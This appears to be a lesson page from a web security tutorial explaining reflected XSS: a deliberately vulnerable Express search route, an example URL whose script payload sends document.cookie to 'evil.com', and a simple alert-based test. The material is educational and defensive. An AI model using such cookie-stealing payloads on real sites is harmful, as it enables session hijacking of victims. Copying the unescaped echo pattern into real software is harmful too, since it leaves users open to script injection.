# 🪞 Reflected XSS

## The Attacker's Script "Bounces Off" the Server

Per OWASP's own definition: "Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other response that includes
some or all of the input sent to the server as part of the request." The malicious script never gets
*stored* anywhere — it travels in a single request and comes right back in that same request's
response.

## A Concrete Example

```js
// VULNERABLE - a search page echoing the query back, unescaped
app.get("/search", (req, res) => {
  res.send(`<h1>Search results for: ${req.query.q}</h1>`);
});
```

```
Attacker crafts a URL:
https://myapp.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

If a VICTIM clicks this link (via a phishing email, a malicious
ad, a disguised link), the SERVER echoes that script tag directly
back into the victim's OWN browser, which then executes it.
```

The attacker never modifies anything on the actual server — the malicious payload lives entirely in
the crafted URL itself, and the vulnerability is purely in how the server *echoes* that URL's content
back into the page without escaping it.

## Why This Requires Tricking the Victim Into a Specific Action

```
Reflected XSS needs the VICTIM to actually visit the crafted,
malicious URL - via a phishing link, a disguised link on social
media, or a malicious ad - since the payload lives in the request
itself, not in anything already stored on the server.
```

This is the key practical distinction from stored XSS (covered next): reflected XSS requires active
social engineering to get a specific victim to click a specific, crafted link — it can't silently
affect every visitor to a page the way a stored payload can.

## Why This Is Still Genuinely Dangerous

```
A crafted URL can be DISGUISED - shortened, embedded in a
seemingly legitimate link, or hidden behind a plausible pretext
("check out this product!") - the fact that it requires a click
doesn't mean it requires OBVIOUS suspicion.
```

Reflected XSS's requirement for a specific user action doesn't meaningfully reduce its real-world
danger — a well-crafted phishing campaign routinely gets a meaningful fraction of targets to click a
disguised link, and a single successful click is enough to fully compromise that victim's session.

## Testing for Reflected XSS

```
1. Find any place user input is echoed back in a response
   (search results, error messages, a "welcome back, {name}"
   greeting)
2. Try submitting <script>alert(1)</script> as that input
3. If an alert box actually pops up when the response renders,
   the input is NOT being escaped, and the endpoint is vulnerable
```

This is a genuinely simple, practical test — any endpoint that echoes user input back into an HTML
response is worth checking this way, since the vulnerability is directly, immediately observable
when present.

## Common Mistakes

- Assuming a URL parameter is "safe" because it's not stored anywhere, missing that reflected XSS
  needs no storage at all to be genuinely dangerous.
- Escaping user input in some response paths (a confirmation page) but missing others (an error
  message, a "did you mean...?" suggestion) that echo the same input.
- Underestimating how effectively a crafted, malicious URL can be disguised as a legitimate,
  trustworthy link.

## ➡️ Next

Continue to [stored-xss.md](stored-xss.md) to see the more severe variant, where the malicious
payload persists and can affect every future visitor.
